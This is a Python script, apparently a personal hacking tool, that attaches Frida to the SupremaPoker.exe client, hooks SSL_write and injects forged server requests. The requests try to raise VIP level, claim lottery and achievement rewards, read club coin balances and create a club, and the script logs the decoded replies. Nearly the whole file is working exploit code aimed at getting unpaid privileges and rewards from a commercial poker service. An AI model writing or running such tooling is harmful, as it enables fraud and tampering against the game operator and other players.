"""Deep VIP exploitation testing via SSL_write injection."""
import frida, sys, time, json, subprocess
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
import msgpack

JS = open('C:/Users/PC/ssl_inject.js', 'r').read()

r = subprocess.check_output('tasklist /FI "IMAGENAME eq SupremaPoker.exe" /FO CSV /NH', shell=True, text=True).strip()
pids = [int(l.split(',')[1].strip('"')) for l in r.splitlines() if 'SupremaPoker' in l]
if not pids: print("NOT RUNNING"); sys.exit(1)
pid = pids[0]
print(f"PID {pid}")

sess = frida.attach(pid)
sc = sess.create_script(JS)
results = []

def on_msg(msg, data):
    if msg['type'] == 'send':
        p = msg['payload']
        t = p.get('t')
        if t == 'ready': print('HOOK OK')
        elif t == 'SSL_GOT': print(f"SSL: {p['addr']}")
        elif t == 'REQ': print(f">>> REQ [{p['id']}] {p['r']}")
        elif t == 'HS': print("--- HANDSHAKE")
        elif t == 'ACK': print("--- HS ACK")
        elif t == 'KICK': print("!!! KICK")
        elif t == 'SRV' and data:
            raw = bytes(data)
            if len(raw) < 1: return
            msgFlag = raw[0]
            msgType = (msgFlag >> 1) & 0x07
            pos = 1
            msgId = 0
            if msgType in (0, 1):
                shift = 0
                while pos < len(raw):
                    b = raw[pos]; msgId |= ((b & 0x7F) << shift); pos += 1
                    if (b & 0x80) == 0: break
                    shift += 7
            body = raw[pos:]
            decoded = None
            try: decoded = json.loads(body)
            except:
                for off in range(min(15, len(body))):
                    try:
                        obj = msgpack.unpackb(body[off:], raw=False, strict_map_key=False)
                        if isinstance(obj, dict): decoded = obj; break
                    except: continue
            if decoded:
                event = str(decoded.get('event', decoded.get('route', '?')))
                code = decoded.get('code', '?')
                results.append((event, code, decoded))
                s = json.dumps(decoded, default=str, ensure_ascii=False)[:600]
                # Print ALL non-jackpot/match messages
                if 'jackpot' not in event and 'matchesStatus' not in event:
                    print(f"<<< [{event}] code={code} {s}")
    elif msg['type'] == 'error':
        print(f"ERROR: {msg.get('description','?')}")

sc.on('message', on_msg)
sc.load()

print('\nWaiting for SSL...')
for i in range(15):
    time.sleep(1)
    state = sc.exports_sync.status()
    if state['ssl'] and state['ready']:
        print(f"Ready at {i+1}s")
        break

state = sc.exports_sync.status()
if not state['ssl']:
    print("No SSL"); sys.exit(1)

nextId = 300

std = {"ver": 7288, "lan": "pt", "verPackage": "5"}

tests = [
    # VIP tests with various payloads
    ("apiPlayer.playerHandler.updateVipLevel", {**std, "level": 0}),
    ("apiPlayer.playerHandler.updateVipLevel", {**std, "level": 1}),
    ("apiPlayer.playerHandler.updateVipLevel", {**std, "level": 2}),
    ("apiPlayer.playerHandler.updateVipLevel", {**std, "vipLevel": 3}),
    ("apiPlayer.playerHandler.updateVipLevel", {**std, "vipLevel": 3, "days": 365}),

    # Luck/rewards
    ("apiPlayer.playerHandler.luckDraw", std),
    ("apiPlayer.playerHandler.receiveTheReward", std),
    ("apiPlayer.playerHandler.getAchievementRewards", std),

    # Profile/info
    ("apiPlayer.playerHandler.userProfile", std),
    ("apiPlayer.playerHandler.setTitle", {**std, "titleId": 1}),
    ("apiPlayer.playerHandler.getApiDataAchievementList", std),

    # Club/trade
    ("apiClub.clubHandler.getLobbyCoins", {**std, "clubID": 14625}),
    ("apiPlayer.playerHandler.getReddotOfNoticeUnread", std),

    # Try creating a club
    ("apiPlayer.playerHandler.createClub", {**std, "clubName": "TestClub123"}),
]

for route, body in tests:
    body_json = json.dumps(body)
    print(f"\n>>> [{nextId}] {route}")
    print(f"    body: {body_json[:100]}")
    try:
        result = sc.exports_sync.inject(route, body_json, nextId)
        print(f"    {result}")
    except Exception as e:
        print(f"    ERROR: {e}")
    nextId += 1
    time.sleep(3)

print(f'\nWaiting 15s...')
for i in range(15): time.sleep(1)

print(f'\n{"="*60}')
print(f'ALL RESULTS ({len(results)} messages)')
print(f'{"="*60}')
for event, code, obj in results:
    if 'jackpot' in event or 'matchesStatus' in event:
        continue
    s = json.dumps(obj, default=str, ensure_ascii=False)[:500]
    print(f"  [{event}] code={code}")
    print(f"    {s}")

try: sc.unload(); sess.detach()
except: pass
print("\nDone.")
